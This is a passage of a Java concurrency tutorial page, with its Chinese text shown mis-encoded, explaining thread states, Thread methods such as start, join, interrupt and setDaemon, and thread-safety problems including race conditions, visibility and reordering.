<p><strong>è¿›å…¥TIMED_WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Thread.sleep(long millis)</code></li>
<li><code>Object.wait(long timeout)</code></li>
<li><code>Thread.join(long millis)</code></li>
<li><code>LockSupport.parkNanos()</code></li>
<li><code>LockSupport.parkUntil()</code></li>
</ul>
<h4 data-id="heading-18">TERMINATEDï¼ˆç»ˆæ­¢ï¼‰</h4>
<p>çº¿ç¨‹æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸ç»ˆæ­¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"æ‰§è¡Œå®Œæˆ"</span>);
});
thread.start();
thread.join(); <span class="hljs-comment">// ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ</span>
System.out.println(thread.getState()); <span class="hljs-comment">// TERMINATED</span>
</code></pre>
<h4 data-id="heading-19">çŠ¶æ€è½¬æ¢å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">    NEW
     |
     | <span class="hljs-built_in">start</span>()
     â†“
RUNNABLE â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     |               |
     | wait()        | <span class="hljs-built_in">notify</span>()/<span class="hljs-built_in">notifyAll</span>()
     â†“               |
  WAITING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     |
     | <span class="hljs-built_in">sleep</span>(timeout)/wait(timeout)/<span class="hljs-built_in">join</span>(timeout)
     â†“
TIMED_WAITING
     |
     | è·å–é”å¤±è´¥
     â†“
  BLOCKED
     |
     | è·å–åˆ°é”
     â†“
RUNNABLE
     |
     | <span class="hljs-built_in">run</span>()æ–¹æ³•æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸
     â†“
 TERMINATED
</code></pre>
<h3 data-id="heading-20">1.4 çº¿ç¨‹çš„åŸºæœ¬æ“ä½œ</h3>
<h4 data-id="heading-21">start()æ–¹æ³•</h4>
<p>å¯åŠ¨çº¿ç¨‹ï¼Œä½¿çº¿ç¨‹è¿›å…¥RUNNABLEçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ"</span>);
});
thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
<span class="hljs-comment">// thread.start(); // é”™è¯¯ï¼ä¸èƒ½é‡å¤è°ƒç”¨start()</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>start()</code>åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œé‡å¤è°ƒç”¨ä¼šæŠ›å‡º<code>IllegalThreadStateException</code></li>
<li><code>start()</code>ä¼šåˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œè€Œ<code>run()</code>åªæ˜¯æ™®é€šæ–¹æ³•è°ƒç”¨</li>
</ul>
<h4 data-id="heading-22">run()æ–¹æ³•</h4>
<p>çº¿ç¨‹çš„æ‰§è¡Œä½“ï¼ŒåŒ…å«çº¿ç¨‹è¦æ‰§è¡Œçš„ä»£ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"runæ–¹æ³•æ‰§è¡Œ"</span>);
});
thread.run(); <span class="hljs-comment">// ç›´æ¥è°ƒç”¨run()ï¼Œä¸ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œåœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œ</span>
thread.start(); <span class="hljs-comment">// è°ƒç”¨start()ï¼Œåˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œrun()æ–¹æ³•</span>
</code></pre>
<p><strong>start() vs run()ï¼š</strong></p>
<ul>
<li><code>start()</code>ï¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œå¼‚æ­¥æ‰§è¡Œ</li>
<li><code>run()</code>ï¼šæ™®é€šæ–¹æ³•è°ƒç”¨ï¼ŒåŒæ­¥æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-23">sleep()æ–¹æ³•</h4>
<p>è®©å½“å‰çº¿ç¨‹ä¼‘çœ æŒ‡å®šæ—¶é—´ï¼Œè¿›å…¥TIMED_WAITINGçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// ä¼‘çœ 1ç§’</span>
    System.out.println(<span class="hljs-string">"ä¼‘çœ ç»“æŸ"</span>);
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    e.printStackTrace();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸é‡Šæ”¾é”</li>
<li>å¯èƒ½æŠ›å‡º<code>InterruptedException</code></li>
<li>æ—¶é—´åˆ°äº†è‡ªåŠ¨å”¤é†’</li>
</ul>
<h4 data-id="heading-24">yield()æ–¹æ³•</h4>
<p>æç¤ºè°ƒåº¦å™¨å½“å‰çº¿ç¨‹æ„¿æ„è®©å‡ºCPUæ—¶é—´ç‰‡ï¼Œä½†è°ƒåº¦å™¨å¯ä»¥å¿½ç•¥è¿™ä¸ªæç¤ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">": "</span> + i);
        Thread.<span class="hljs-keyword">yield</span>(); <span class="hljs-comment">// è®©å‡ºCPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>yield()</code>åªæ˜¯æç¤ºï¼Œä¸ä¿è¯ä¸€å®šä¼šè®©å‡ºCPU</li>
<li>é€‚åˆç”¨äºè°ƒè¯•å’Œæµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒä¸å¸¸ç”¨</li>
</ul>
<h4 data-id="heading-25">join()æ–¹æ³•</h4>
<p>ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">2000</span>);
        System.out.println(<span class="hljs-string">"thread1æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        thread1.join(); <span class="hljs-comment">// ç­‰å¾…thread1æ‰§è¡Œå®Œæˆ</span>
        System.out.println(<span class="hljs-string">"thread2æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

thread1.start();
thread2.start();
</code></pre>
<p><strong>é‡è½½æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>join()</code> - æ— é™æœŸç­‰å¾…</li>
<li><code>join(long millis)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´</li>
<li><code>join(long millis, int nanos)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆçº³ç§’ç²¾åº¦ï¼‰</li>
</ul>
<h4 data-id="heading-26">interrupt()æ–¹æ³•</h4>
<p>ä¸­æ–­çº¿ç¨‹ï¼Œè®¾ç½®çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
        System.out.println(<span class="hljs-string">"è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// æ•è·å¼‚å¸¸åï¼Œä¸­æ–­æ ‡å¿—ä½è¢«æ¸…é™¤</span>
            System.out.println(<span class="hljs-string">"çº¿ç¨‹è¢«ä¸­æ–­"</span>);
            Thread.currentThread().interrupt(); <span class="hljs-comment">// é‡æ–°è®¾ç½®ä¸­æ–­æ ‡å¿—</span>
            <span class="hljs-keyword">break</span>;
        }
    }
});

thread.start();
Thread.sleep(<span class="hljs-number">3000</span>);
thread.interrupt(); <span class="hljs-comment">// ä¸­æ–­çº¿ç¨‹</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>interrupt()</code>åªæ˜¯è®¾ç½®ä¸­æ–­æ ‡å¿—ä½ï¼Œä¸ä¼šå¼ºåˆ¶åœæ­¢çº¿ç¨‹</li>
<li>çº¿ç¨‹éœ€è¦æ£€æŸ¥ä¸­æ–­æ ‡å¿—ä½å¹¶è‡ªè¡Œé€€å‡º</li>
<li>å¦‚æœçº¿ç¨‹åœ¨é˜»å¡çŠ¶æ€ï¼ˆsleepã€waitç­‰ï¼‰ï¼Œä¼šæŠ›å‡º<code>InterruptedException</code></li>
</ul>
<h4 data-id="heading-27">isInterrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¸ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
thread.start();
thread.interrupt();
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// true</span>
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// trueï¼ˆæ ‡å¿—ä½è¿˜åœ¨ï¼‰</span>
</code></pre>
<h4 data-id="heading-28">interrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥å½“å‰çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java">Thread.currentThread().interrupt();
System.out.println(Thread.interrupted()); <span class="hljs-comment">// true</span>
System.out.println(Thread.interrupted()); <span class="hljs-comment">// falseï¼ˆæ ‡å¿—ä½è¢«æ¸…é™¤ï¼‰</span>
</code></pre>
<h4 data-id="heading-29">setDaemon()å®ˆæŠ¤çº¿ç¨‹</h4>
<p>è®¾ç½®çº¿ç¨‹ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå½“æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹ç»“æŸæ—¶ï¼ŒJVMä¼šè‡ªåŠ¨é€€å‡ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">daemonThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        System.out.println(<span class="hljs-string">"å®ˆæŠ¤çº¿ç¨‹è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
});

daemonThread.setDaemon(<span class="hljs-literal">true</span>); <span class="hljs-comment">// è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹</span>
daemonThread.start();

Thread.sleep(<span class="hljs-number">3000</span>);
System.out.println(<span class="hljs-string">"ä¸»çº¿ç¨‹ç»“æŸï¼ŒJVMé€€å‡º"</span>);
<span class="hljs-comment">// å®ˆæŠ¤çº¿ç¨‹ä¹Ÿä¼šéšä¹‹ç»“æŸ</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ˆæŠ¤çº¿ç¨‹ä¸èƒ½ç‹¬ç«‹å­˜åœ¨ï¼Œå¿…é¡»ä¾èµ–éå®ˆæŠ¤çº¿ç¨‹</li>
<li>é€‚åˆæ‰§è¡Œåå°ä»»åŠ¡ï¼Œå¦‚åƒåœ¾å›æ”¶ã€ç›‘æ§ç­‰</li>
<li>å¿…é¡»åœ¨<code>start()</code>ä¹‹å‰è®¾ç½®</li>
</ul>
<h4 data-id="heading-30">setPriority()çº¿ç¨‹ä¼˜å…ˆçº§</h4>
<p>è®¾ç½®çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼ˆ1-10ï¼‰ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"é«˜ä¼˜å…ˆçº§: "</span> + i);
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"ä½ä¼˜å…ˆçº§: "</span> + i);
    }
});

thread1.setPriority(Thread.MAX_PRIORITY); <span class="hljs-comment">// 10</span>
thread2.setPriority(Thread.MIN_PRIORITY);  <span class="hljs-comment">// 1</span>

thread1.start();
thread2.start();
</code></pre>
<p><strong>ä¼˜å…ˆçº§å¸¸é‡ï¼š</strong></p>
<ul>
<li><code>Thread.MIN_PRIORITY = 1</code></li>
<li><code>Thread.NORM_PRIORITY = 5</code>ï¼ˆé»˜è®¤ï¼‰</li>
<li><code>Thread.MAX_PRIORITY = 10</code></li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ä¼˜å…ˆçº§åªæ˜¯æç¤ºï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½å¿½ç•¥</li>
<li>ä¸åŒæ“ä½œç³»ç»Ÿå¯¹ä¼˜å…ˆçº§çš„å¤„ç†ä¸åŒ</li>
<li>ä¸æ¨èä¾èµ–ä¼˜å…ˆçº§æ¥ä¿è¯ç¨‹åºæ­£ç¡®æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-31">ç¬¬äºŒç«  çº¿ç¨‹å®‰å…¨åŸºç¡€</h2>
<h3 data-id="heading-32">2.1 ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨</h3>
<h4 data-id="heading-33">çº¿ç¨‹å®‰å…¨çš„å®šä¹‰</h4>
<p>**çº¿ç¨‹å®‰å…¨ï¼ˆThread Safetyï¼‰**æ˜¯æŒ‡å½“å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¸éœ€è¦é¢å¤–çš„åŒæ­¥æœºåˆ¶ï¼Œç¨‹åºä»èƒ½æ­£ç¡®æ‰§è¡Œï¼Œå¹¶ä¸”ç»“æœç¬¦åˆé¢„æœŸã€‚</p>
<p><strong>Brian Goetzåœ¨ã€ŠJavaå¹¶å‘ç¼–ç¨‹å®æˆ˜ã€‹ä¸­çš„å®šä¹‰ï¼š</strong></p>
<blockquote>
<p>å½“å¤šä¸ªçº¿ç¨‹è®¿é—®æŸä¸ªç±»æ—¶ï¼Œä¸ç®¡è¿è¡Œæ—¶ç¯å¢ƒé‡‡ç”¨ä½•ç§è°ƒåº¦æ–¹å¼æˆ–è€…è¿™äº›çº¿ç¨‹å°†å¦‚ä½•äº¤æ›¿æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ä¸»è°ƒä»£ç ä¸­ä¸éœ€è¦ä»»ä½•é¢å¤–çš„åŒæ­¥æˆ–ååŒï¼Œè¿™ä¸ªç±»éƒ½èƒ½è¡¨ç°å‡ºæ­£ç¡®çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå°±ç§°è¿™ä¸ªç±»æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p>
</blockquote>
<h4 data-id="heading-34">ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰</h4>
<p><strong>ç«æ€æ¡ä»¶</strong>æ˜¯æŒ‡ç¨‹åºçš„æ‰§è¡Œç»“æœä¾èµ–äºçº¿ç¨‹æ‰§è¡Œçš„ç›¸å¯¹æ—¶åºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaceCondition</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">RaceCondition</span> <span class="hljs-variable">rc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaceCondition</span>();
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        t1.start();
        t2.start();
        t1.join();
        t2.join();
        
        System.out.println(<span class="hljs-string">"æœ€ç»ˆç»“æœ: "</span> + rc.getCount()); 
        <span class="hljs-comment">// æœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000</span>
    }
}
</code></pre>
<p><strong>åŸå› åˆ†æï¼š</strong>
<code>count++</code>ä¸æ˜¯åŸå­æ“ä½œï¼Œå®é™…åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>è¯»å–countçš„å€¼</li>
<li>å°†countåŠ 1</li>
<li>å°†æ–°å€¼å†™å›count</li>
</ol>
<p>ä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¯»å–åˆ°ç›¸åŒçš„å€¼ï¼Œå¯¼è‡´ç»“æœä¸æ­£ç¡®ã€‚</p>
<h4 data-id="heading-35">æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰</h4>
<p><strong>æ•°æ®ç«äº‰</strong>æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«å˜é‡ï¼Œå¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å†™ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataRace</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        value = <span class="hljs-number">42</span>;
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å¯èƒ½è¢«é‡æ’åº</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            System.out.println(value); <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°value=0</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-36">å¯è§æ€§é—®é¢˜</h4>
<p><strong>å¯è§æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„ä¿®æ”¹ï¼Œèƒ½å¤ŸåŠæ—¶è¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ²¡æœ‰volatileä¿®é¥°</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (running) {
                <span class="hljs-comment">// å¯èƒ½æ°¸è¿œå¾ªç¯ï¼Œå› ä¸ºçœ‹ä¸åˆ°runningçš„å˜åŒ–</span>
            }
            System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
        }).start();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
        running = <span class="hljs-literal">false</span>; <span class="hljs-comment">// ä¿®æ”¹å¯èƒ½å¯¹å…¶ä»–çº¿ç¨‹ä¸å¯è§</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">VisibilityProblem</span> <span class="hljs-variable">vp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VisibilityProblem</span>();
        vp.start();
        Thread.sleep(<span class="hljs-number">1000</span>);
        vp.stop(); <span class="hljs-comment">// å¯èƒ½æ— æ³•åœæ­¢çº¿ç¨‹</span>
    }
}
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªçº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬</li>
<li>æŒ‡ä»¤é‡æ’åºï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
</code></pre>
<h4 data-id="heading-37">åŸå­æ€§é—®é¢˜</h4>
<p><strong>åŸå­æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-comment">// åŸå­æ“ä½œç¤ºä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">incrementSync</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ç°åœ¨æ˜¯åŸå­æ“ä½œ</span>
    }
}
</code></pre>
<p><strong>éåŸå­æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<ul>
<li><code>count++</code> - è¯»å–ã€ä¿®æ”¹ã€å†™å…¥ä¸‰æ­¥</li>
<li><code>count = count + 1</code> - åŒä¸Š</li>
<li><code>obj.field = obj.field + 1</code> - åŒä¸Š</li>
</ul>
<p><strong>åŸå­æ“ä½œï¼š</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹çš„èµ‹å€¼ï¼ˆlongå’Œdoubleåœ¨32ä½JVMä¸Šé™¤å¤–ï¼‰</li>
<li>volatileå˜é‡çš„è¯»å†™</li>
<li>synchronizedå—å†…çš„æ“ä½œ</li>
</ul>
<h4 data-id="heading-38">æœ‰åºæ€§é—®é¢˜</h4>
<p><strong>æœ‰åºæ€§</strong>æ˜¯æŒ‡ç¨‹åºæ‰§è¡Œçš„é¡ºåºæŒ‰ç…§ä»£ç çš„å…ˆåé¡ºåºæ‰§è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderingProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
        b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°a=0ï¼Œb=2ï¼ˆé‡æ’åºï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b;
        }
    }
}
</code></pre>
<p><strong>æŒ‡ä»¤é‡æ’åºçš„åŸå› ï¼š</strong></p>
<ul>
<li>ç¼–è¯‘å™¨ä¼˜åŒ–</li>
<li>CPUæŒ‡ä»¤çº§å¹¶è¡Œ</li>
<li>å†…å­˜ç³»ç»Ÿé‡æ’åº</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
